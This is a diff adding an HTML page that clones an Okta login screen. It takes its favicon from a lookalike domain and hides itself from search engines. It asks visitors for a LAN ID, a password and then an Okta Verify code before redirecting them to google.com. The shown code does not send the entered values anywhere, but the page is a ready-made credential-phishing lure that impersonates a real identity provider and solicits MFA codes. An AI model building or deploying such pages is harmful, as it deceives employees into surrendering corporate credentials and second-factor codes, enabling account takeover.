@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Okta - Login</title>
+    <link rel="shortcut icon" href="https://okta.bib.bio/favicon.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link href="./Okta - Login_files/okta-sign-in.min.css" type="text/css" rel="stylesheet">
+    <link href="./Okta - Login_files/loginpage-theme.6ca7f7a516a56275837982a82a0a7533.css" type="text/css" rel="stylesheet">
+    <script src="./Okta - Login_files/jquery.min.js"></script>
+    <style>
+        .banner img {
+            width: 180%;
+            max-width: 100%;
+            height: 100px;
+        }
+        .username-display {
+            margin-top: 10px;
+            font-weight: bold;
+            color: #007dc1;
+            text-align: center;
+        }
+        .password-field {
+            display: none; /* Initially hidden */
+            text-align: center; /* Center align the password field */
+        }
+        .lan-id-display {
+            margin: 10px 0;
+            text-align: center; /* Center align the LAN ID display */
+        }
+        .lan-id-image {
+            height: 1.5em; /* Match height to text size */
+            vertical-align: middle; /* Align image with text */
+            margin-right: 12px; /* Space between image and text */
+            margin-bottom: 0.5em; /* Space below the image */
+            position: relative; /* Enable adjustment */
+            top: 5px; /* Move image down slightly */
+        }
+        .label-left {
+            text-align: left; /* Align label to the left */
+            display: block; /* Ensure it behaves like a block element */
+            margin-bottom: 5px; /* Space between label and input */
+        }
+        .eye-icon {
+            cursor: pointer;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 1em;
+        }
+        .password-wrapper {
+            position: relative; /* To position the eye icon */
+        }
+        .o-form-input input {
+            width: 100%; /* Ensure inputs take full width */
+            box-sizing: border-box; /* Include padding in width */
+            padding: 10px; /* Consistent padding */
+            border: 1px solid #ccc; /* Consistent border */
+            border-radius: 4px; /* Consistent border radius */
+        }
+    </style>
+</head>
+<body>
+    <header class="banner">
+        <img src="./Okta - Login_files/Header.jpg" alt="Banner Image" class="banner-image" />
+    </header>
+    <div class="auth okta-container">
+        <div id="login-bg-image" class="login-bg-image tb--background" style="background-image: none"></div>
+        <div class="content">
+            <div id="signin-container">
+                <main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style="display: block;">
+                    <div class="okta-sign-in-header auth-header" id="okta-sign-in-header">
+                        <h1>
+                            <img src="./Okta - Login_files/logo.png" class="auth-org-logo" alt="logo" aria-label="logo">
+                        </h1>
+                    </div>
+                    <div class="auth-content">
+                        <div class="auth-content-inner">
+                            <div class="siw-main-header" id="siw-main-header">
+                                <div>
+                                    <div>
+                                        <div data-type="beacon-container" class="beacon-container" id="beacon-container" style="transform: scale(1, 1); text-indent: 1px;">
+                                            <div class="beacon-blank auth-beacon">
+                                                <div class="beacon-blank js-blank-beacon-border auth-beacon-border"></div>
+                                            </div>
+                                            <div class="bg-helper auth-beacon auth-beacon-factor mfa-okta-password" data-se="factor-beacon" id="factor-beacon">
+                                                <div class="okta-sign-in-beacon-border auth-beacon-border"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="primary-auth">
+                                <form novalidate="novalidate" id="login-form" class="primary-auth-form o-form o-form-edit-mode">
+                                    <div class="o-form-content o-form-theme clearfix">
+                                        <h2 class="okta-form-title o-form-head" id="lan-id-title">Enter your LAN ID</h2>
+                                        <div class="o-form-error-container" data-se="o-form-error-container"></div>
+                                        <div class="o-form-fieldset-container" data-se="o-form-fieldset-container" id="o-form-fieldset-container">
+                                            <div class="o-form-fieldset o-form-label-top margin-btm-5" id="lan-id-fieldset">
+                                                <div class="okta-form-label o-form-label">
+                                                    <label for="lan-id">LAN ID</label>
+                                                </div>
+                                                <div class="o-form-input">
+                                                    <span class="o-form-input-name-username o-form-control okta-form-input-field input-fix">
+                                                        <input type="text" placeholder="" name="lan-id" id="lan-id" aria-label="" autocomplete="username" aria-required="true" required="">
+                                                    </span>
+                                                    <div id="lan-id-error" style="color: red; font-size: 0.9em; display: none; margin-top: 5px;"></div> <!-- Error message container -->
+                                                </div>                                                
+                                            </div>
+                                            <div class="password-field" id="password-fieldset">
+                                                <h2 class="okta-form-title o-form-head">Verify with your password</h2>
+                                                <div class="lan-id-display" id="lan-id-display"></div>
+                                                <div class="o-form-fieldset o-form-label-top margin-btm-5" id="password-field-input">
+                                                    <div class="okta-form-label o-form-label">
+                                                        <label class="label-left" for="okta-signin-password" id="password-label">Password</label>
+                                                    </div>
+                                                    <div class="o-form-input password-wrapper" id="o-form-input password-wrappe">
+                                                        <input type="password" id="password" placeholder="" name="password" aria-label="" autocomplete="current-password" aria-required="true" required="">
+                                                        <img src="./Okta - Login_files/eye-icon.png" class="eye-icon" id="toggle-password" onclick="togglePassword()" alt="Toggle Password Visibility" />
+                                                        <button id="verify-button" style="display: none; font:caption; width: 90px;">Verify</button>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="o-form-button-bar">
+                                        <input class="button button-primary" type="button" onclick="handleNext()" value="Next" id="okta-signin-submit" data-type="save">
+                                    </div>
+                                </form>
+                                <div class="auth-footer">
+                                    <a href="#" class="link help js-help">Need help signing in?</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="footer-container clearfix">
+                <p class="copyright">
+                    Powered by
+                    <a href="#" class="inline-block notranslate">Okta</a>
+                </p>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript">
+        function handleNext() {
+            const lanId = document.getElementById("lan-id").value.trim();
+            const passwordInput = document.getElementById("password").value.trim();
+    
+            if (lanId && !passwordInput) {
+                // Step 1: After LAN ID is entered
+                document.getElementById("lan-id-fieldset").style.display = "none";
+                document.getElementById("lan-id-title").style.display = "none";
+                document.getElementById("password-fieldset").style.display = "block";
+    
+                // Display LAN ID with image
+                document.getElementById("lan-id-display").innerHTML = `<img src="./Okta - Login_files/user.png" class="lan-id-image" alt="Image" />` + lanId;
+    
+                // Change button text to "Verify"
+                document.getElementById("okta-signin-submit").value = "Verify";
+    
+                // Adjust styles for the header and icons
+                document.getElementById("okta-sign-in-header").style.height = "100px";
+                document.getElementById("siw-main-header").style.display = "block";
+                document.getElementById("beacon-container").style.position = "absolute";
+                document.getElementById("beacon-container").style.top = "37px";
+                document.getElementById("o-form-fieldset-container").style.marginTop = "40px";
+                document.getElementById("factor-beacon").style.backgroundImage = `url(./password@2x.png)`;
+    
+            } else if (passwordInput) {
+                // Step 2: After password is entered, transition to entering the code
+                document.getElementById("password").value = ""; // Clear password input
+                document.getElementById("password-fieldset").querySelector('h2').textContent = "Okta Verify";
+                document.getElementById("factor-beacon").style.backgroundImage = `url(./oktaVerify@2x.png)`;
+    
+                // Hide password visibility toggle and show verify button
+                document.getElementById("toggle-password").style.display = "none";
+                document.getElementById("okta-signin-submit").style.display = "none";
+                document.getElementById("verify-button").style.display = "inline-block";
+    
+                // Adjust label and layout for code entry
+                document.getElementById("password-label").textContent = "Enter Code";
+                document.getElementById('o-form-input password-wrappe').style.display = 'flex';
+                document.getElementById('o-form-input password-wrappe').style.flexDirection = 'row';
+                document.getElementById('o-form-input password-wrappe').style.justifyContent = 'space-between';
+                document.getElementById('password').style.width = '200px';
+            } else {
+                alert("Please enter your LAN ID.");
+            }
+        }
+    
+        function togglePassword() {
+            const passwordInput = document.getElementById("password");
+            const toggle = document.getElementById("toggle-password");
+            
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text"; // Show password
+                toggle.src = "./Okta - Login_files/eye-open-icon.png"; // Update this path for open eye icon
+            } else {
+                passwordInput.type = "password"; // Hide password
+                toggle.src = "./Okta - Login_files/eye-icon.png"; // Update this path for closed eye icon
+            }
+        }
+    
+        // This function prevents the default form submission and redirects to another URL when the "Verify" button is clicked
+        document.getElementById("verify-button").addEventListener("click", function(event) {
+            event.preventDefault(); // Prevent the default form submission
+            window.location.href = "https://google.com"; // Replace with your desired URL
+        });
+    </script>
+       
+</body>
+</html>
